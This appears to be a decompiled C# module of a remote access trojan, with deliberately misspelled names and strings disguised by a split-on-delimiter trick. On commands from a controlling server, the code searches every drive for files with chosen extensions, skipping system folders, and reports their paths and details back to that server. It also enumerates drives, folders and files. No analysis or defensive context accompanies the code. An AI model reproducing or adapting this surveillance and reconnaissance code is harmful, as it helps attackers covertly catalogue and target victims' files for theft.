using System;
using System.Collections.Generic;
using System.IO;

namespace thandhwiar;

internal class DSADRIVF
{
	public MSAMCDM iserver;

	public int sIndx;

	public List<string> notdFilders = new List<string>();

	public List<string> sFidles = new List<string>();

	public int fIndsx;

	public List<string> fEsxts = new List<string>();

	public bool reaging;

	public void send_Seasrch(string path)
	{
		try
		{
			foreach (string item in add_Fildes(path))
			{
				string extension = Path.GetExtension(item);
				if (fEsxts.Contains(extension.ToLower()))
				{
					string text = iserver.file_info(item, ret: true);
					iserver.push_dsata(null, "sesarf=!".Split(new char[1] { '!' })[0] + item + "<FILDE_AUTDO<!".Split(new char[1] { '!' })[0] + text);
				}
				if (iserver.auttCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string check_Folsders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (see_Accsess(text2))
				{
					text = text + text2 + ">|".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public DSADRIVF()
	{
		notdFilders.Add("windows|".Split(new char[1] { '|' })[0]);
		notdFilders.Add("program files (x86)|".Split(new char[1] { '|' })[0]);
		notdFilders.Add("program files|".Split(new char[1] { '|' })[0]);
		notdFilders.Add("system volume information|".Split(new char[1] { '|' })[0]);
	}

	public string lookup_Fises(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public IEnumerable<string> add_Fildes(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.auttCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (see_Accsess(text) && !notdFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void look_Filses(string tempStr)
	{
		iserver.auttCnls = false;
		fEsxts.Clear();
		sFidles.Clear();
		fIndsx = 0;
		sIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				fEsxts.Add(text);
			}
		}
		if (array[1] != "")
		{
			reaging = true;
			send_Seasrch(array[1]);
			reaging = false;
			iserver.push_dsata(null, "sesard=seasing!".Split(new char[1] { '!' })[0]);
			return;
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		reaging = true;
		DriveInfo[] array4 = drives;
		foreach (DriveInfo driveInfo in array4)
		{
			if (driveInfo.IsReady)
			{
				send_Seasrch(driveInfo.Name);
			}
		}
		iserver.push_dsata(null, "sesard=seashing!".Split(new char[1] { '!' })[0]);
		reaging = false;
	}

	public string lookup_Drsves()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">!".Split(new char[1] { '!' })[0];
			}
		}
		return text;
	}

	public bool see_Accsess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
